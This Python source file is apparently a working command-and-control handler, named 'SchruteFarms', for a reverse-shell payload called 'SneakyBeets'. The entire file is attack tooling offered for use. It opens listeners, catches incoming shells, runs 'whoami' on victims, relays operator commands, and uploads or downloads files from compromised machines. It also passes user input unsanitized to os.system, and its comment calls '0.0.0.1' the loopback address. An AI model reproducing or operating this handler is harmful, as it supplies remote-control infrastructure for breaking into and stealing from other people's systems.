#!/usr/bin/env python3

#This is a python version of the SchruteFarms handler

import socket
import os
import threading
import readline
from time import sleep
from art import text2art

#cool intro stuff
awesome = text2art("SchruteFarms")

print(awesome)
print("This is a handler for the one and only SneakyBeets payload")
print("Written by Jarod Keene\n")


HOST = '0.0.0.1'		# Standard loopback interface address (localhost)
PORT = 1234			# Port to listen on (non-privileged ports are > 1023)

sessions = []
listeners = []

class listenerClass:
	listening_port = 1234	#define the port for a listener (so no other listeners are started)
	listener_id = 0	#to id the listener
	listenerIdCount = 0	#this will hold next available listenerID

class sessionClass:
	socket = 0	#to hold the connection socket for writing and reading
	session_id = 0 #to id the session
	local_port = 0 #just for used port sake
	remote_port = 0	#for cool looks
	remote_ip = 0 #for cool looks
	remote_user = "UNKNOWN" #whoami is run instantly so the user can recognize perms
	shell_count = 0 #for id'ing
	sessionIdCount = 0	#this will hold next available 
	session_type = "UNKNOWN" #hold the session type (windows/linux)


def main():
	while 1:
		command = getCommand()

		commands = command.split(" ")

		#if the user wants to start a new listener
		if commands[0] == "listener":
			if len(commands) > 1:
				try:
					lisPort = int(commands[1])
				except:
					print("Integer required")
					continue
				#start a listener thread if proper int is given
				thread = threading.Thread(target=listener, args=(lisPort,))
				thread.daemon = True
				thread.start()

			else:
				print("Usage: listener <port>")
		
		#this is a simple listener case for testing (listening on port 1234)
		elif commands[0] == "default":
			thread = threading.Thread(target=listener, args=(1234,))
			thread.daemon = True
			thread.start()

		#if the user wants to display the current listeners
		elif commands[0] == "listeners":
			if not listeners:
				print("\nNo current listeners\n")
			else:
				print("Listeners:\n")
				for lis in listeners:
					print("Listener ID: " + str(lis.listener_id) + "   Listening Port: " + str(lis.listening_port))
				print("")

		#if the user wants to display the current sessions
		elif commands[0] == "sessions":
			if not sessions:
				print("\nNo current sessions\n")
			else:
				print("Sessions:\n")
				for sesh in sessions:
					print("Session ID: " + str(sesh.session_id) + "  Remote IP: " + str(sesh.remote_ip) + "   Remote User: " + sesh.remote_user[:-1] + "   Session Type: " + sesh.session_type)
				print("")

		#if the user wants to interact with a given session by session id
		elif commands[0] == "session" or commands[0] == "interact":
			try:
				sid = int(commands[1])
			except:
				print("Usage: session <sid>")
				continue
			interact(sid)

		#if the user wants to kill a current session by session id
		elif commands[0] == "kill":
			try:
				sid = int(commands[1])
			except:
				print("Usage: kill <sid>")
				continue
			sesh = getSession(sid)
			if sesh:
				kill(sesh)
				sessions.remove(sesh)
			else:
				print("Session not found")

		#this will open the help menu txt file and print it out
		elif commands[0] == "help":
			f = open("help.txt", 'r')
			menu = f.read()
			print('\n' + menu +'\n')
			f.close() #close the open file

		#LOCAL COMMAND EXECUTION

		#on local directory listing
		elif commands[0] == "lls" or commands[0] == "ls":
			os.system('ls')

		#on local file cat
		elif commands[0] == "cat":
			if len(commands) > 1:
				os.system('cat ' + commands[1])
			else:
				print("Usage: cat <filename>")

		#on clear command
		elif commands[0] == "clear":
			clear()

		#on exit we have to be sure to close all existing connections
		elif commands[0] == "exit":
			for sesh in sessions:
				kill(sesh)
			print("Exiting...")
			return

		#if the input isn't recognized
		else:
			print("Bad Input.")


#Defined helping functions:

def clear():
	if os.name == "posix":
		os.system('clear')
	else:
		os.system('cls')



def getCommand():
	#read input until something is given and then return the command
	c = ""
	while not c:
	   c = input("SchruteFarms> ")

	return c


def interact(sid):
	#interact with a given session passing in a session id
	curr = getSession(sid)

	if not curr:
		#if no session with given session id
		print("Session ID not found.")
		return

	cont = 1
	while cont:
		#now we can pass commands to the payload for execution
		data = "filler"
		if curr.shell_count == 0:
			command = input("SneakyBeets " + str(curr.session_id) + "-> ")
		else:
			command = input()

		comParts = command.split(" ")
		#special command cases:

		if not command:
			continue
		#for backgrounding a session
		elif command == "bg" or command == "background":
			return

		#download files
		elif comParts[0] == "download":
			if len(comParts) > 1:
				download(curr, comParts[1])
			else:
				download(curr, "")
			continue
		#upload files
		elif comParts[0] == "upload":
			if len(comParts) > 1:
				upload(curr, comParts[1])
			else:
				upload(curr, "")
			continue

		#on local directory listing
		elif command == "lls":
			os.system('ls')
			continue
		#on local file cat
		elif comParts[0] == "lcat":
			if len(comParts) > 1:
				os.system('cat ' + comParts[1])
			else:
				print("Usage: cat <filename>")
			continue


		#printing session information while in sessions
		elif command == "info":
			print("Session ID: " + str(curr.session_id) + "  Remote IP: " + str(curr.remote_ip) + "   Remote User: " + curr.remote_user[:-1] + "   Session Type: " + curr.session_type)
			continue

		#for handling shell cases
		elif command == "shell" or command == "shell2" or command == "ushell" or command == "zshell":
			curr.shell_count = curr.shell_count + 1 #one layer deeper
		elif command == "exit":
			curr.shell_count = curr.shell_count - 1 #back one layer

		command += '\n' #this is for socket purposes (handling in netcat and such)

		try:
			curr.socket.sendall(command.encode())
		except:
			print("Socket write failed")
			return

		sleep(0.1) #stupid thing to make sure socket is ready to fully read

		data = curr.socket.recv(8192)
		print(data.decode())

		#leave conditions
		if command == "exit\n" and curr.shell_count == -1:
			cont = 0
			kill(curr)
			sessions.remove(curr)
		if not data: #if read nothing (for nonblocking later)
			cont = 0


def kill(sesh):
	#to kill the connection of a session (not removing from sessions list)
	command = "exit\n"
	#send exit to stop client payload
	try:
		sesh.socket.sendall(command.encode())
		#receive final response
		data = sesh.socket.recv(2048)
		print("Session: " + str(sesh.session_id) + " closed")
		sesh.socket.close()

	except:
		print("Session already dead")


def getSession(sid):
	#return session by session id
	for sesh in sessions:
		if sesh.session_id == sid:
			return sesh

	return 0


def listener(port):
	#instantiate a listener on the port passed
	#check if port is in legit range
	if port < 1024 or port > 65535:
		print("INVALID PORT")
		return
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		print("Starting listener....\n")
		try:
			s.bind((HOST, port))
		except:
			print("Port already in use")
			return
		#print("Socket bind complete") debugging purposes

		s.listen()
		print("Listening on port " + str(port))

		# add a new listener to the listener list
		newlist = listenerClass()
		newlist.listener_id = listenerClass.listenerIdCount
		listenerClass.listenerIdCount += 1
		newlist.listening_port = str(port)
		listeners.append(newlist)

		#now sit and wait for a connection to be made
		#on connection pop the listener and create a session
		conn, addr = s.accept()

		listeners.remove(newlist)
		s.shutdown(socket.SHUT_RDWR)
		s.close()

		print('New session opened:')
		print('Connected by ' + addr[0] + ':' + str(addr[1]))
		#initial connection stuff
		data = conn.recv(2048)
		print(data.decode())

		newsesh = sessionClass()
		newsesh.socket = conn
		if "linux" in data.decode():
			newsesh.session_type = "linux"

		#give the session the next available id
		newsesh.session_id = sessionClass.sessionIdCount
		sessionClass.sessionIdCount += 1

		newsesh.local_port = port
		newsesh.remote_port = str(addr[1])
		newsesh.remote_ip = addr[0]
		newsesh.continueSession = 1

		command = "whoami\n"
		newsesh.socket.sendall(command.encode())
		newsesh.remote_user = newsesh.socket.recv(2048).decode()

		sessions.append(newsesh)


#download and upload functionality:
def download(sesh, fileName):
	#download a file from the client
	command = "download\n"
	sesh. socket.sendall(command.encode())
	data = sesh.socket.recv(2048)
	if data:
		if not fileName:
			fileName = input("File name: ")
		sesh.socket.sendall(fileName.encode())
		fileData = sesh.socket.recv(8192)
		newFile = open(fileName, "w")
		newFile.write(fileData.decode())
		newFile.close()
	else:
		print("Failed to receive reply")

def upload(sesh, fileName):
	#upload a file to the client
	if not fileName:
		fileName = input("File name: ")

	command = "upload\n"
	sesh.socket.sendall(command.encode())
	data = sesh.socket.recv(2048)
	if data:
		sesh.socket.sendall(fileName.encode())
		response = sesh.socket.recv(1024)
		uploadFile = open(fileName, "r")
		fileData = uploadFile.read()
		sesh.socket.sendall(fileData.encode())
		uploadFile.close()
	else:
		print("Failed to receive reply")



if __name__ == '__main__':
	main()
